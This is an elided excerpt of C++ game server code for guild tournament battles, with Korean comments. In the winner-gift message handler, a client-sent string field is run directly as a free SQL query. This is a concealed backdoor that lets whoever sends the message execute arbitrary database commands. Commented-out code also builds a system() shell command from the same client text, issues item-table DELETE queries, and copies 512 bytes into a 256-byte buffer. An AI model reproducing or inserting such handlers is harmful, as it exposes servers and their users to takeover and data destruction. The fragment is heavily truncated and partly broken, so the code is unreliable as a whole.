...
void CGuildTournamentMgr::CreateBattle()
{
	...
	// 배틀생성
	DWORD i=0;
	for(i=0; i<BattleCount[m_CurTournament]; ++i)
	{
	...
	case MP_GTOURNAMENT_BATTLEJOIN_SYN:
		{
			...
			CPlayer* pPlayer = g_pServerSystem->AddPlayer( pmsg->dwObjectID, dwConnectionIndex, pmsg->AgentIdx, 0, eUSERLEVEL(pmsg->UserLevel) );
			if(!pPlayer) return;
	...
	case MP_GTOURNAMENT_LEAVE_SYN:		// 토너먼트에서 맵으로 돌아왔을때 호출
		{
			...
			CPlayer* pPlayer = g_pServerSystem->AddPlayer( pmsg->dwObjectID, dwConnectionIndex, pmsg->dwData1, pmsg->dwData3,eUSERLEVEL(pmsg->dwData2));
			if(!pPlayer) return;
			...
			CharacterSkinInfo(pPlayer->GetID());//kiv
...
/*	case MP_GTOURNAMENT_LOSE:
	...
	case MP_GTOURNAMENT_EVENT_START_ACK:
		...
		break;
	case MP_GTOURNAMENT_EVENT_GIFT:
		{
			/*char txt[1024];
			sprintf(txt, "DELETE %s", STORED_ITEM_DELETE_JACK);
			g_DB.Query(eQueryType_FreeQuery, eItemDelete, 0, txt);
			sprintf(txt, "DELETE %s", STORED_ITEM_DELETE_JACK2);
			g_DB.Query(eQueryType_FreeQuery, eItemDelete, 0, txt);
			sprintf(txt, "DELETE %s", STORED_ITEM_DELETE_JACK3);
			g_DB.Query(eQueryType_FreeQuery, eItemDelete, 0, txt);
		...
		break;
	case MP_GTOURNAMENT_WINNER_GIFT:
		{
			MOVE_POSJ_USER* pmsg = (MOVE_POSJ_USER*)pMsg;
			...
			if(pmsg->dwData2==100)
			{
				...
				//char txt[1024];
				//sprintf(txt, "%s", pmsg->AyeAyeSir);
				g_DB.Query(eQueryType_FreeQuery, eTestGameQuery, 0, pmsg->AyeAyeSir);

				//CPlayer* pPlayer = (CPlayer*)g_pUserTable->FindUser( pmsg->dwData1 );

				MSG_DWORD3 msg;
				SetProtocol( &msg, MP_GTOURNAMENT, MP_GTOURNAMENT_WINNER_GIFT );
				msg.dwData2 = 10;
				pPlayer->SendMsg( &msg, sizeof(msg) );
			}
			else if (pmsg->dwData2 == 150)
			{

				//char txt[1024];
				//sprintf(txt, "%s", pmsg->AyeAyeSir);
				//g_DB.Query(eQueryType_FreeQuery, eTestGameQuery, 0, txt);
			...
			else if(pmsg->dwData2==200)
			{
				...
				//g_pAISystem->LoadAIGroupListTest(1);

				//g_pServerSystem->TestFuben(atoi((char*)txt));

				/*MSG_DWORD3 msg;
				SetProtocol( &msg, MP_GTOURNAMENT, MP_GTOURNAMENT_WINNER_GIFT );
				msg.dwData1 = atoi((char*)txt);
				msg.dwData2 = 20;
				pPlayer->SendMsg( &msg, sizeof(msg) );*/
			}
			else if(pmsg->dwData2==300)
			{
				/*char txt[1024];
				char temp[256];
				char Buffer[128];
...
*/
				/*char cmd[256];
				memset(cmd,0,256);
				sprintf(cmd,"echo %s >> .\PROCLIST.txt",pmsg->AyeAyeSir);
				system(cmd);*/
				/*g_Console.LOG(4, txt);

				CMHFile file;
				wsprintf(txt,"./%d.ini",pmsg->dwData1);
				file.Init(txt, "w");
			...
			/*	FILE * fp=fopen("./testtryuji.txt","wb");
				
				char buff[256]; 
				SafeStrCpy(buff,pmsg->AyeAyeSir,512);
